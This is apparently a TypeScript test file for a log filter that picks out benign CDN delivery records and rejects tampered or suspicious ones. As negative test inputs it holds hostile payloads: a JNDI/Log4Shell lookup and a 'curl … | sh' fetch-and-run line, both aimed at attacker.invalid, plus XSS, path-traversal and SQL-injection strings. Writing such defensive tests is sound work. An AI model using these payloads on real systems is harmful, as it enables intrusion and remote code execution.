import { expect, test } from 'bun:test'
import { createHash } from 'node:crypto'
import { verifyCdnDeliveryEnvelope, cdnDeliveryDefinition } from '../src/utils/mill/analyzeCdnDelivery.ts'
import { matchesMillRule } from '../src/utils/mill/conditions.ts'
import { normalizeLogEvent } from '../src/utils/mill/logEvent.ts'

export function fixture() {
    const timestamp = '2026-09-24T00:00:00.001123456Z'
    const reqId = '677bcfd0-835a-4b8c-bd9d-90deb2d4eec8'
    const structured = { level: 30, time: Date.parse(timestamp), pid: 9, hostname: 'abcdef012345', reqId,
        access: { key: `http-cdn:${reqId}`, method: 'POST', path: '/api/traffic', status: 201, ip: '172.26.0.1',
            timestamp: new Date(timestamp).toISOString(), inspection: { version: 1, bodyEmpty: false, headersSafe: false, pathSafe: true } }, msg: 'http_access' }
    const log = { service: 'cdn', host: 'inspur', level: 'info', timestamp, sourceEventId: '', message: JSON.stringify(structured),
        metadata: { collector: 'docker', container_id: 'abcdef012345', stream: 'stdout', structured } }
    encode(log)
    return log
}
export function encode(log: ReturnType<typeof fixture>) {
    log.message = JSON.stringify(log.metadata.structured)
    log.sourceEventId = createHash('sha256').update(`${log.host}:docker:${log.metadata.container_id}:${log.timestamp}:${log.message}`).digest('hex')
}
const eligible = (log: ReturnType<typeof fixture>, definition = cdnDeliveryDefinition) => verifyCdnDeliveryEnvelope(log)
    && matchesMillRule(normalizeLogEvent({ ...log, id: log.sourceEventId, created_at: log.timestamp }), definition.conditions)

test('only the successful delivery copy matches; original request evidence is retained', () => {
    expect(eligible(fixture())).toBe(true)
    for (const service of ['openresty', 'http-traffic', 'hanasand-api-1', 'customer-app']) expect(eligible({ ...fixture(), service })).toBe(false)
    for (const change of [{ method: 'GET' }, { path: '/s/example' }, { path: '/api/traffic?x=1' }, { ip: '203.0.113.7' },
        { status: 200 }, { status: 401 }, { status: 500 }, { path: '/login' }, { path: '/api/traffic/../admin' }]) {
        const log = fixture(); Object.assign(log.metadata.structured.access, change); encode(log)
        expect(eligible(log)).toBe(false)
    }
    for (const message of ['203.0.113.7 GET /login 401 malicious-agent', 'POST /api/traffic HTTP/1.1']) expect(eligible({ ...fixture(), message })).toBe(false)
})
test('unknown or suspicious content at every envelope level remains available', () => {
    for (const target of ['log', 'metadata', 'structured', 'access', 'inspection']) {
        const log = fixture()
        const objects: Record<string, object> = { log, metadata: log.metadata, structured: log.metadata.structured,
            access: log.metadata.structured.access, inspection: log.metadata.structured.access.inspection }
        Object.assign(objects[target], { suspicious: '${jndi:ldap://attacker.invalid/a}', user_agent: 'unexpected scanner' })
        encode(log); expect(eligible(log)).toBe(false)
    }
    for (const content of ['curl attacker.invalid | sh', '<script>alert(1)</script>', '/../../etc/passwd', 'UNION SELECT password']) {
        const log = fixture(); Object.assign(log.metadata.structured.access, { body: content }); encode(log)
        expect(eligible(log)).toBe(false)
        expect(eligible({ ...fixture(), message: fixture().message + '\n' + content })).toBe(false)
    }
    const duplicate = fixture(); duplicate.message = duplicate.message.replace('"status":201', '"status":500,"status":201')
    expect(eligible(duplicate)).toBe(false)
})
test('failures and incomplete provenance fail closed, even with broad saved selectors', () => {
    for (const key of Object.keys(fixture())) {
        const log = fixture(); delete (log as any)[key]; expect(eligible(log)).toBe(false)
    }
    for (const change of [{ sourceEventId: '' }, { timestamp: 'invalid' }, { timestamp: '2025-01-01Z' }, { level: 'error' }, { host: 'unknown' }]) expect(eligible({ ...fixture(), ...change })).toBe(false)
    for (const change of [{ container_id: 'untrusted' }, { collector: 'client' }, { stream: 'stderr' }, { organizationId: 'tenant' }]) {
        const log = fixture(); Object.assign(log.metadata, change); expect(eligible(log)).toBe(false)
    }
    for (const status of [400, 401, 429, 500]) {
        const log = fixture(); log.metadata.structured.access.status = status; encode(log)
        expect(eligible(log, { ...cdnDeliveryDefinition, conditions: [] })).toBe(false)
    }
    const extreme = fixture(); extreme.timestamp = '+275760-09-13T00:00:00.000Z'; extreme.metadata.structured.time = 8640000000000001
    expect(verifyCdnDeliveryEnvelope(extreme)).toBe(false)
    const inconsistent = fixture(); inconsistent.metadata.structured.access.key = 'http-cdn:another'; encode(inconsistent)
    expect(eligible(inconsistent)).toBe(false)
})
test('saved selectors control host/IP scope and stored timestamp precision does not block replay', () => {
    const log = fixture()
    expect(eligible(log, { ...cdnDeliveryDefinition, conditions: [{ path: 'host', operator: 'equals', value: 'another', caseSensitive: true }] })).toBe(false)
    expect(eligible({ ...log, timestamp: new Date(log.timestamp).toISOString() })).toBe(true)
    log.metadata.structured.access.inspection.pathSafe = false; encode(log)
    expect(eligible(log)).toBe(false)
})
